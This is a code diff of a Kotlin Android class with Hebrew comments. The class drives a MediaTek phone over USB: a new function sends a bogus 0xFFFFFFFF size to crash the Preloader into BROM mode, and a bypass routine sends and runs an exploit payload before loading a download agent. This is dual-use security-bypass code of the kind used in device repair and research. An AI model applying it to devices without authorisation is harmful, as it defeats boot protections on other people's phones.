@@ -10,6 +10,60 @@ import java.util.Locale
 
 object MtkBromConnection {
     
+    // פונקציה חדשה: גורמת לקריסת ה-Preloader כדי לעבור ל-BROM
+    fun crashPreloader(usbManager: UsbManager, device: UsbDevice): Boolean {
+        val connection = usbManager.openDevice(device) ?: return false
+        
+        var epIn: UsbEndpoint? = null
+        var epOut: UsbEndpoint? = null
+        var claimedInterface = false
+
+        for (i in 0 until device.interfaceCount) {
+            val usbInterface = device.getInterface(i)
+            if (connection.claimInterface(usbInterface, true)) {
+                for (j in 0 until usbInterface.endpointCount) {
+                    val ep = usbInterface.getEndpoint(j)
+                    if (ep.type == UsbConstants.USB_ENDPOINT_XFER_BULK) {
+                        if (ep.direction == UsbConstants.USB_DIR_IN) epIn = ep
+                        else if (ep.direction == UsbConstants.USB_DIR_OUT) epOut = ep
+                    }
+                }
+                if (epIn != null && epOut != null) {
+                    claimedInterface = true
+                    break 
+                }
+            }
+        }
+
+        if (!claimedInterface || epIn == null || epOut == null) {
+            connection.close()
+            return false
+        }
+
+        val resp = ByteArray(1)
+        
+        // 1. לחיצת יד ל-Preloader
+        connection.bulkTransfer(epOut, byteArrayOf(0xA1.toByte()), 1, 2000)
+        if (connection.bulkTransfer(epIn, resp, 1, 2000) <= 0) {
+            connection.close(); return false
+        }
+
+        // 2. שליחת פקודת Send DA (0xD7)
+        connection.bulkTransfer(epOut, byteArrayOf(0xD7.toByte()), 1, 2000)
+        if (connection.bulkTransfer(epIn, resp, 1, 2000) <= 0) {
+            connection.close(); return false
+        }
+
+        // 3. שליחת גודל הזוי (0xFFFFFFFF) כדי לגרום לקריסה
+        val badSize = byteArrayOf(0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte(), 0xFF.toByte())
+        connection.bulkTransfer(epOut, badSize, 4, 2000)
+        
+        // אנחנו לא מחכים לתגובה, סוגרים את החיבור ומקווים לקריסה
+        connection.close()
+        return true
+    }
+
+    // פונקציית הפריצה הרגילה (Payload + DA)
     fun executeBypassAndSendDa(
         usbManager: UsbManager, 
         device: UsbDevice,
@@ -52,7 +106,6 @@ object MtkBromConnection {
             return if (connection.bulkTransfer(epIn, resp, 1, 2000) > 0) resp[0] else null
         }
 
-        // פונקציה פנימית לשליחת קובץ בינארי (משמשת גם ל-Payload וגם ל-DA)
         fun sendBinaryFile(fileName: String, fileBytes: ByteArray): String? {
             onProgress("מכין לשלוח $fileName...")
             if (!sendCmd(0xD7.toByte())) return "שגיאה: פקודת 0xD7 נכשלה."
@@ -80,13 +133,12 @@ object MtkBromConnection {
                 offset += length
                 onProgress("שולח $fileName... ${(offset * 100) / fileBytes.size}%")
             }
-            return null // Success
+            return null
         }
 
-        // 1. לחיצת יד
-        onProgress("מבצע לחיצת יד...")
-        val isBrom = device.productId == 0x0003 || device.productId == 0x0001
-        if (!sendCmd(if (isBrom) 0xA0.toByte() else 0xA1.toByte())) {
+        // 1. לחיצת יד (אנחנו כבר יודעים שזה BROM כי קרסנו את הקודם)
+        onProgress("מבצע לחיצת יד BROM...")
+        if (!sendCmd(0xA0.toByte())) {
             connection.close(); return "שגיאה: שליחת לחיצת יד נכשלה."
         }
         val hsAck = readAck()
@@ -94,7 +146,7 @@ object MtkBromConnection {
             connection.close(); return "שגיאה בלחיצת יד: $hsAck"
         }
 
-        // 2. שליחת ה-Payload (הפריצה)
+        // 2. שליחת ה-Payload
         val payloadError = sendBinaryFile("Payload", payloadBytes)
         if (payloadError != null) {
             connection.close(); return payloadError
@@ -105,9 +157,7 @@ object MtkBromConnection {
         if (!sendCmd(0xD5.toByte())) {
             connection.close(); return "שגיאה: שליחת פקודת הרצה ל-Payload נכשלה."
         }
-        readAck() // לא חייבים לבדוק, לרוב מתנתק פה
-
-        // --- אם הגענו לפה, האבטחה אמורה להיות עקופה ---
+        readAck()
         
         // 4. שליחת ה-DA האמיתי
         val daError = sendBinaryFile("DA", daBytes)
